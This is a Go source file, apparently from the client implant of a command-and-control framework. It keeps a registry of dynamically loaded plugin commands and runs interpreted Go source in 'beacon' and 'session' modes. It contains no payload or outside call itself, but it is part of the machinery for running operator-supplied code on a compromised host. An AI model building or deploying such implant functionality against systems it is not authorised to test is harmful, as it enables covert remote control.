package interpreter_client

import (
	"fmt"
	"sync"

	"src/Client/dynamic"
	"src/Client/generic/commands"
	"src/Client/generic/logger"
)

// In-memory store for dynamic commands and their interpreters
type DynamicCommand struct {
	// For built-in commands we keep the adapter client forever in-process.
	Client       commands.BuiltInCommand
	BeaconClient commands.BuiltInCommand

	// Source code of the plugin (interpreted mode only)
	source string

	// Go interpreter for the plugin
	interpreter *dynamic.Interpreter

	// Protects access to the command
	mu sync.Mutex
}

var dynamicCommands = make(map[string]*DynamicCommand)
var dynamicCommandsMutex sync.RWMutex

// builtInCommands holds instances of built-in command interface
var builtInCommands = make(map[string]commands.BuiltInCommand)

func RegisterBuiltInCommand(name string, cmd commands.BuiltInCommand) {
	builtInCommands[name] = cmd
}

// LoadDynamicCommandSource loads interpreted Go source code
func LoadDynamicCommandSource(cmdName string, source string) error {
	if len(source) == 0 {
		return fmt.Errorf("no plugin source provided for %s", cmdName)
	}

	dynamicCommandsMutex.Lock()
	defer dynamicCommandsMutex.Unlock()

	dc, ok := dynamicCommands[cmdName]
	if !ok || dc == nil {
		dc = &DynamicCommand{}
	}

	dc.source = source
	dc.interpreter = dynamic.NewInterpreter()
	dynamicCommands[cmdName] = dc

	logger.Log(fmt.Sprintf("Loaded interpreted module '%s' (%d bytes)", cmdName, len(source)))
	return nil
}

// ExecuteFromBeacon executes a loaded dynamic command in beacon context
func ExecuteFromBeacon(cmdName string, args []string, data string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()

	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}

	// Fast path for built-ins
	if _, isBuiltin := builtInCommands[cmdName]; isBuiltin {
		return dc.BeaconClient.ExecuteFromBeacon(args, data)
	}

	dc.mu.Lock()
	defer dc.mu.Unlock()

	logger.Log(fmt.Sprintf("Executing interpreted plugin '%s' (beacon mode)", cmdName))
	return dc.interpreter.ExecuteFromBeacon(dc.source, args, data)
}

// ExecuteFromSession executes a loaded dynamic command in session context
func ExecuteFromSession(cmdName string, args []string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()

	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}

	// Fast path for built-ins
	if _, isBuiltin := builtInCommands[cmdName]; isBuiltin {
		return dc.Client.ExecuteFromSession(args)
	}

	dc.mu.Lock()
	defer dc.mu.Unlock()

	logger.Log(fmt.Sprintf("Executing interpreted plugin '%s' (session mode)", cmdName))
	return dc.interpreter.Execute(dc.source, args)
}

// HasCommand checks if a dynamic command is loaded
func HasCommand(cmdName string) bool {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	dc, ok := dynamicCommands[cmdName]
	return ok && dc != nil
}

// ListDynamicCommands returns the names of loaded dynamic commands
func ListDynamicCommands() []string {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	list := make([]string, 0, len(dynamicCommands))
	for name := range dynamicCommands {
		list = append(list, name)
	}
	return list
}
